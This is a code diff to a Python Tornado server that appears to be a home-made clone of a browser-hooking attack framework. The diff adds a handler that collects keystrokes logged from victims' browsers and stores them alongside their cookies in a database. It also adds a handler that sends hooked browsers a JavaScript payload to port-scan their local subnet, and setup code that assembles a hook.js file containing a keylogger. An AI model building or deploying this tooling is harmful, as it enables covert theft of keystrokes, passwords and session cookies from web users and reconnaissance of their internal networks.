@@ -2,6 +2,8 @@
 
 import os.path
 import sys
+import json
+
 import tornado.httpserver
 import tornado.ioloop
 import tornado.options
@@ -42,6 +44,7 @@ class Application(tornado.web.Application):
                 (r'/poll',PollHandler),
                 (r'/command',CommandHandler),
                 (r'/log',LogHandler),
+                (r'/scan',ScanHandler),
                 ]
 
         setting={
@@ -146,14 +149,17 @@ class PollHandler(tornado.web.RequestHandler):
         f1=post_body.index("cookies=")
         f2=post_body.find("&",f1)
         cookies=post_body[f1:f2]
-        print cookies
+        
 
         client = pymongo.MongoClient("mongodb://localhost:27017")
         db = client.hookbrowser
         if self.check_id_in(hook_id,db):
             print "already in "
         else:
-            db.info.insert({"ua":ua,"hook_id":hook_id,"IP":IP,"cookies":cookies,"browser_version":browser_version})
+            db.info.insert({"ua":ua,"hook_id":hook_id,"IP":IP,"cookies":cookies,
+                "browser_version":browser_version,"log":"","scan_result":"",
+
+                })
 
     def post(self):
         header = dict(self.request.headers)
@@ -180,13 +186,167 @@ class CommandHandler(tornado.web.RequestHandler):
         cmd = self.get_argument('cmd')
         cmd_id = self.get_argument('cmd_id')
 
+key_result=''
+
 class LogHandler(tornado.web.RequestHandler):
     def post(self):
+#cross domain handler - similar to poll  
+        header = dict(self.request.headers)
+        origin = header["Origin"]
+        self.set_header("Access-Control-Allow-Origin",origin)
+        self.set_header("Access-Control-Allow-Credentials","true")
+        hook_id = self.get_cookie("hook_id")
+
+        print hook_id
+
+        global key_result
+        key_map = {'1':'!','2':'@','3':'#','4':'$','5':'%','6':'^','7':'&','8':'*','9':'(','10':')',
+        "-":"_","=":"+",",":"<",".":">","/":"?","[":"{","]":"}",
+        }
         self.set_header('Access-Control-Allow-Origin','*')
-        print self.request.body
-#        print self.get_argument()
+        key_data = json.loads(self.request.body)
+        print key_data
+        for i in key_data:
+            if i['modify']['shift']:
+                try:
+                    res = key_map[chr(i['code'])]
+                    key_result+=res
+                except Exception, e:
+                    pass
+            else:
+                key_result+=chr(i['code'])
+
+        print "get the key : "+key_result
+#connect to databse and save the log
+
+        client = pymongo.MongoClient("mongodb://localhost:27017")
+        db = client.hookbrowser
+        doc = db.info.find_one({"hook_id":hook_id})
+
+        doc["log"] = doc["log"]+key_result
+        db.info.save(doc)
+
+        key_result = ''
+        print "save key log in database"
+
+class ScanHandler(tornado.web.RequestHandler):
+    def post(self):
+        scan_payload = """
+        function ipcreate(ip){
+    var ips = ip.replace(/(\d+\.\d+\.\d+)\.\d+/,"$1.");
+    for(var i=1;i<=255;i++){
+        CreateScript(ips+i,80);
+        CreateScript(ips+i,22);
+    }
+}
+
+function CreateScript(ip,xport){
+    var s = document.createElement("script");
+    s.setAttribute("onload","scan_find(\'"+ip+"\',\'"+xport+"\')");
+    s.src="http://"+ip+":"+xport;
+    document.body.appendChild(s);
+}
+
+ipcreate(target_ip);
+        """
         
+        global cmd
+        global cmd_id
+        try:
+            scan_ip = self.get_argument('scan_ip')
+        except Exception, e:
+            pass
+
+        var_dic = locals()
+        if "scan_ip" in var_dic:
+            cmd_id = self.get_argument("cmd_id")
+            cmd = "var target_ip = '"+scan_ip+"';"+scan_payload
+        else:
+            scan_result = self.get_argument("ip")+":"+self.get_argument("port")
+            print scan_result
+#connect to database ,save the scan_result
+
+            header = dict(self.request.headers)
+            origin = header["Origin"]
+            self.set_header("Access-Control-Allow-Origin",origin)
+            self.set_header("Access-Control-Allow-Credentials","true")
+            hook_id = self.get_cookie("hook_id")
+
+            client = pymongo.MongoClient("mongodb://localhost:27017")
+            db = client.hookbrowser
+            doc = db.info.find_one({"hook_id":hook_id})
+
+            res_database = doc["scan_result"].split(" ")
+            if scan_result in res_database:
+                pass
+            else:
+                doc["scan_result"] = doc["scan_result"]+" "+scan_result
+                db.info.save(doc)
+
+            scan_result = ''
+
+
+import socket
+import fcntl
+import struct
+import os   
+import fileinput
+import subprocess 
+import re 
+
+#current_path = os.path.abspath('.')
+hook_path = "/root/pybeef/templates/static/hook.js"
+current_path = os.path.abspath('.')
+def get_ip_address(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    return socket.inet_ntoa(fcntl.ioctl(
+        s.fileno(),
+        0x8915,  # SIOCGIFADDR
+        struct.pack('256s', ifname[:15])
+    )[20:24])
+
+def start_database():
+#    data_msg = os.popen("mongod --dbpath "+current_path+"/data")
+    cmd = "mongod --dbpath "+current_path+"/data & > /dev/null" 
+    child = subprocess.Popen(args=cmd,shell=True)   
+    print "start mongodb pid: "+str(child.pid)
+    child.wait()
+
+def config_hook(ip):
+    for line in fileinput.input(hook_path,inplace=True):
+        p = re.search(r"\d+\.\d+\.\d+\.\d+",line)
+        if p:
+            print line.replace(p.group(),ip),
+        else:
+            print line,
+    fileinput.close()
+
+def gen_hook():
+    os.chdir("/root/pybeef/templates/static/")
+    fp_hook = open('hook.js','w')
+    fp_hook.truncate()
+    for file_name in ['jquery-3.1.1.js','request.js','webrtc.js','pybeef.js',
+    'browser_me.js','keylogger.js']:
+        with open(file_name) as f:
+            f_js = f.read()
+        fp_hook.write(f_js)
+
+def beef_init():
+    ip = get_ip_address("eth0")
+    print "get local ip address :"+ip
+    
+    print "start database..."
+    start_database()
+    print "generate hook.js"
+    gen_hook()
+
+    print "config hook.js"
+    config_hook(ip)
+    
+    print "exit"
+
 if __name__ == '__main__':
+    beef_init()
     tornado.options.parse_command_line()
     http_server = tornado.httpserver.HTTPServer(Application())
     http_server.listen(options.port)
